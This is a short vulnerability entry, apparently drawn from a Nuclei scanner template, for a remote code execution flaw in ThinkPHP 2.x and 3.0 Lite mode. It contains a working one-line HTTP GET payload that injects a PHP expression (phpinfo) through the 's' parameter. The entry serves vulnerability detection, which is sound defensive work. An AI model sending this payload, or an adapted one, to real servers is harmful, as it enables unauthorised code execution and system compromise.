# Vulnerability: ThinkPHP 2/3 - Remote Code Execution
**Classification:** CWE-95
**Source:** Nuclei Template (`thinkphp-2-rce.yaml`)

## Description
ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```

